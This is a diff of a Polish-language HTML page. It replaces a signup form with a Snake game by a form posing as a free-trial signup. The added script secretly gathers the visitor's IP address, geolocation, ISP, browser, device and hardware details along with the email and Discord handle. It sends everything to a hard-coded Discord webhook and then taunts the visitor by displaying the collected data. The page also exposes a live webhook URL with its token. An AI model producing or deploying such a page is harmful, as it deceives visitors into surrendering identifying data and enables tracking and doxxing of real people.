@@ -1,228 +1,120 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formularz i Snake</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #2c2f33;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            background-color: #23272a;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            width: 350px;
-            text-align: center;
-        }
-
-        h2 { margin-bottom: 20px; color: #7289da; }
-
-        input[type="text"], input[type="email"], textarea {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-            background-color: #40444b;
-            color: white;
-            box-sizing: border-box;
-        }
-
-        .checkbox-group {
-            text-align: left;
-            margin: 10px 0;
-            font-size: 0.9em;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #7289da;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button:hover { background-color: #5b6eae; }
-
-        #game-container {
-            display: none;
-            text-align: center;
-        }
-
-        canvas {
-            border: 5px solid #7289da;
-            background-color: #000;
-            display: block;
-            margin: 20px auto;
-        }
-
-        .score { font-size: 20px; margin-bottom: 10px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Formularz na darmową wersję próbną</title>
+<style>
+body {
+  font-family: Segoe UI, sans-serif;
+  background:#2c2f33;
+  color:#fff;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
+.container {
+  background:#23272a;
+  padding:30px;
+  border-radius:10px;
+  width:360px;
+  box-shadow:0 0 20px #000;
+}
+input, textarea, button {
+  width:100%;
+  margin:10px 0;
+  padding:10px;
+  border:none;
+  border-radius:5px;
+  background:#40444b;
+  color:#fff;
+}
+button {
+  background:#7289da;
+  font-weight:bold;
+  cursor:pointer;
+}
+h2 { color:#7289da; }
+small { opacity:0.7; }
+</style>
 </head>
 <body>
 
-    <div id="form-section" class="container">
-        <h2>Zapisz się</h2>
-        <form id="data-form">
-            <input type="email" id="email" placeholder="Twój Email" optional>
-            <input type="text" id="discord" placeholder="discord" required>
-            <textarea id="message" placeholder="Jak oceniasz aplikacje?" rows="3" required></textarea>
-            
-            <div class="checkbox-group">
-                <input type="checkbox" id="remember">
-                <label for="remember">Zapamiętaj mnie</label>
-            </div>
-            
-            <button type="submit">Prześlij i graj</button>
-        </form>
-    </div>
+<div id="form" class="container">
+  <h2>Zapisz się na darmową wersje próbną</h2>
+  <input id="email" type="email" placeholder="Email" required>
+  <input id="discord" type="text" placeholder="Discord">
+  <textarea id="msg" placeholder="Wiadomość"></textarea>
+  <button onclick="send()">Wyślij</button>
+</div>
 
-    <div id="game-container">
-        <h2>Gra Snake</h2>
-        <div class="score">Wynik: <span id="current-score">0</span></div>
-        <canvas id="snakeGame" width="400" height="400"></canvas>
-        <p>Używaj strzałek, aby sterować!</p>
-    </div>
+<div id="info" class="container" style="display:none;">
+  <h2>Twoje dane 😈</h2>
+  <div id="out"></div>
+  <small>Internet pamięta więcej niż myślisz XD</small>
+</div>
 
-    <script>
-        const form = document.getElementById('data-form');
-        const formSection = document.getElementById('form-section');
-        const gameContainer = document.getElementById('game-container');
-        const canvas = document.getElementById('snakeGame');
-        const ctx = canvas.getContext('2d');
-        const scoreElement = document.getElementById('current-score');
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1456448681988587722/TMNtUrwrtDN3EaXznge_tBA_HIX71xiT2o4my4D6XiJ9otCJRut71qaRvOaNbMGh54gH"
 
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456448681988587722/TMNtUrwrtDN3EaXznge_tBA_HIX71xiT2o4my4D6XiJ9otCJRut71qaRvOaNbMGh54gH';
+async function send() {
+  try {
+    const ipReq = await fetch("https://ipapi.co/json/")
+    const ip = await ipReq.json()
 
-        // Obsługa wysyłki formularza
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+    const data = {
+      email: email.value,
+      discord: discord.value || "brak",
+      message: msg.value || "brak",
 
-            const data = {
-                email: document.getElementById('email').value,
-                discord: document.getElementById('discord').value,
-                message: document.getElementById('message').value,
-                remember: document.getElementById('remember').checked
-            };
+      ip: ip.ip,
+      city: ip.city,
+      region: ip.region,
+      country: ip.country_name,
+      isp: ip.org,
+      timezone: ip.timezone,
 
-            // Wysłanie danych na Discord Webhook
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "Nowe zgłoszenie!",
-                            color: 7506394,
-                            fields: [
-                                { name: "Email", value: data.email, inline: true },
-                                { name: "Discord", value: data.discord, inline: true },
-                                { name: "Zapamiętać?", value: data.remember ? "Tak" : "Nie", inline: true },
-                                { name: "Wiadomość", value: data.message }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: screen.width + "x" + screen.height,
+      cpu: navigator.hardwareConcurrency || "?",
+      ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "?",
+      touch: 'ontouchstart' in window,
+      cookies: navigator.cookieEnabled
+    }
 
-                // Ukryj formularz i pokaż grę
-                formSection.style.display = 'none';
-                gameContainer.style.display = 'block';
-                startSnakeGame();
+    await fetch(WEBHOOK, {
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify({
+        embeds:[{
+          title:"Nowy formularz XDDD",
+          color:15158332,
+          fields:Object.entries(data).map(([k,v])=>({
+            name:k,
+            value:String(v)
+          })),
+          timestamp:new Date()
+        }]
+      })
+    })
 
-            } catch (error) {
-                alert('Wystąpił błąd podczas wysyłania danych.');
-                console.error(error);
-            }
-        });
+    document.getElementById("form").style.display="none"
+    document.getElementById("info").style.display="block"
 
-        // --- LOGIKA GRY SNAKE ---
-        function startSnakeGame() {
-            let box = 20;
-            let score = 0;
-            let snake = [{ x: 9 * box, y: 10 * box }];
-            let food = {
-                x: Math.floor(Math.random() * 19 + 1) * box,
-                y: Math.floor(Math.random() * 19 + 1) * box
-            };
-            let d;
+    document.getElementById("out").innerHTML =
+      Object.entries(data).map(([k,v]) =>
+        `<p><b>${k}:</b> ${v}</p>`
+      ).join("")
 
-            document.addEventListener("keydown", direction);
+  } catch {
+    alert("Zdechło jak argumenty w komentarzach XDDD 😈")
+  }
+}
+</script>
 
-            function direction(event) {
-                if(event.keyCode == 37 && d != "RIGHT") d = "LEFT";
-                else if(event.keyCode == 38 && d != "DOWN") d = "UP";
-                else if(event.keyCode == 39 && d != "LEFT") d = "RIGHT";
-                else if(event.keyCode == 40 && d != "UP") d = "DOWN";
-            }
-
-            function collision(head, array) {
-                for(let i = 0; i < array.length; i++) {
-                    if(head.x == array[i].x && head.y == array[i].y) return true;
-                }
-                return false;
-            }
-
-            function draw() {
-                ctx.fillStyle = "black";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-                for(let i = 0; i < snake.length; i++) {
-                    ctx.fillStyle = (i == 0) ? "#7289da" : "white";
-                    ctx.fillRect(snake[i].x, snake[i].y, box, box);
-                    ctx.strokeStyle = "black";
-                    ctx.strokeRect(snake[i].x, snake[i].y, box, box);
-                }
-
-                ctx.fillStyle = "#f04747";
-                ctx.fillRect(food.x, food.y, box, box);
-
-                let snakeX = snake[0].x;
-                let snakeY = snake[0].y;
-
-                if( d == "LEFT") snakeX -= box;
-                if( d == "UP") snakeY -= box;
-                if( d == "RIGHT") snakeX += box;
-                if( d == "DOWN") snakeY += box;
-
-                if(snakeX == food.x && snakeY == food.y) {
-                    score++;
-                    scoreElement.innerText = score;
-                    food = {
-                        x: Math.floor(Math.random() * 19 + 1) * box,
-                        y: Math.floor(Math.random() * 19 + 1) * box
-                    };
-                } else {
-                    snake.pop();
-                }
-
-                let newHead = { x: snakeX, y: snakeY };
-
-                if(snakeX < 0 || snakeX >= canvas.width || snakeY < 0 || snakeY >= canvas.height || collision(newHead, snake)) {
-                    clearInterval(game);
-                    alert("Koniec gry! Twój wynik: " + score);
-                    location.reload(); // Restart aplikacji
-                }
-
-                snake.unshift(newHead);
-            }
-
-            let game = setInterval(draw, 100);
-        }
-    </script>
 </body>
 </html>
